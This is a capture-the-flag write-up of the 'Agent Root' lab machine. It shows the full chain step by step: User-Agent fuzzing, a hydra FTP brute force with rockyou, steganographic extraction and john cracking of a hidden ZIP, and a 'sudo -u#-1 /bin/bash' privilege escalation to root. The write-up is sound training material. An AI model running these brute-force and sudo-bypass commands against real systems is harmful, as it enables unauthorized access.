# CTF Writeup: Agent Root

**Target IP:** 10.64.132.208  

---

## 📌 Overview

This machine demonstrates multiple attack techniques including:

- User-Agent based content manipulation  
- FTP brute force attack  
- Steganography exploitation  
- Password cracking  
- Base64 decoding  
- Sudo privilege escalation  

---

## 1️⃣ Information Gathering & Port Scanning

An initial port scan was conducted to identify open services and versions.

| Port | State | Service | Version |
|------|-------|---------|----------|
| 21/tcp | open | FTP | vsftpd 3.0.3 |
| 22/tcp | open | SSH | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 |
| 80/tcp | open | HTTP | Apache httpd 2.4.29 |

---

## 2️⃣ Web Enumeration

Directory discovery using `gobuster` with multiple wordlists yielded no results.

However, manual inspection of the webpage revealed a clue:

> "from agent R"

### 🔎 User-Agent Fuzzing

The server appeared to respond differently depending on the `User-Agent` header.

Using:

```bash
curl -L -A "C" http://10.64.132.208
```

A hidden message was revealed:

> "Attention chris, Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! From, Agent R"

This confirmed the target username:

```
chris
```

---

## 3️⃣ Exploitation – FTP Brute Force

Since the message mentioned a weak password, a brute-force attack was performed against FTP using `hydra` and the `rockyou.txt` wordlist:

```bash
hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.64.132.208 ftp
```

The correct password was recovered successfully.

After logging in via FTP:

```bash
mget *
```

All available files were downloaded.

---

## 4️⃣ Steganography & Data Extraction

A note from Agent C indicated that:

- The "alien-like photos" were fake  
- A login password was hidden inside a fake image  

### 📦 Extracting Embedded ZIP

Using `binwalk`:

```bash
binwalk -e <picture_name>
```

A hidden ZIP archive was extracted from one of the images.

The ZIP file was password protected.

---

### 🔓 Cracking the ZIP Password

Converted the ZIP to a crackable hash format:

```bash
zip2john 8702.zip > zip.hash
john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

The password was successfully cracked.

---

### 🧩 Decoding the Passphrase

After extracting the ZIP using `7z`, a `.txt` file containing a Base64 encoded string was found.

Decoding the string revealed a passphrase.

---

### 🕵️ Extracting SSH Credentials

Using the decoded passphrase with `steghide`:

```bash
steghide extract -sf <picture_name>.jpg
```

This revealed:

- A new username  
- An SSH password  

---

## 5️⃣ Initial Access & Privilege Escalation

An SSH connection was established using the extracted credentials.

During local enumeration, the `sudo` configuration was checked and a known privilege escalation technique was identified.

### 🚀 Exploit

```bash
sudo -u#-1 /bin/bash
```

This command granted immediate root access.

---

## 🏁 Root Flag

The final flag was located at:

```
/root/root.txt
```

---

## 🧠 Key Takeaways

- Always test HTTP header manipulation (e.g., User-Agent)
- Weak passwords remain a common attack vector
- Steganography can hide valuable credentials
- Password cracking tools remain powerful
- Misconfigured sudo permissions can lead to instant privilege escalation

---

**End of Writeup**
